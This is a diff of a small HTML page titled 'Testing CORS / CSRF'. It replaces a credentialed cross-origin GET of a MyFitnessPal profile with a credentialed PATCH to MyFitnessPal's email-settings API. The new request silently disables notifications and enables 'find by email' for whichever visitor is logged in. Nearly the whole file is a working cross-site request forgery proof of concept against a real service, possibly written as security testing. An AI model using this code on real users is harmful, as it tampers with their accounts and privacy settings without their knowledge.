@@ -1,18 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <script>
-    fetch("https://www.myfitnesspal.com/profile/stark7_", {
-      method: "GET",
-      credentials: "include"
+<h1>Testing CORS / CSRF</h1>
+<script>
+fetch("https://www.myfitnesspal.com/api/services/account/email_settings", {
+    method: "PATCH",
+    credentials: "include", // force cookies to be sent
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      ep: { for_messages: false },
+      enews: { announcement: false },
+      pref: { find_by_email: true }
     })
-    .then(r => r.text())
-    .then(data => {
-      document.body.innerText = "Fetched data:\n\n" + data;
-    })
-    .catch(err => {
-      document.body.innerText = "Error: " + err;
-    });
-  </script>
+})
+.then(r => {
+    document.body.innerHTML += "<p>Response: " + r.status + "</p>";
+})
+.catch(e => {
+    document.body.innerHTML += "<p>Error: " + e + "</p>";
+});
+</script>
 </body>
 </html>
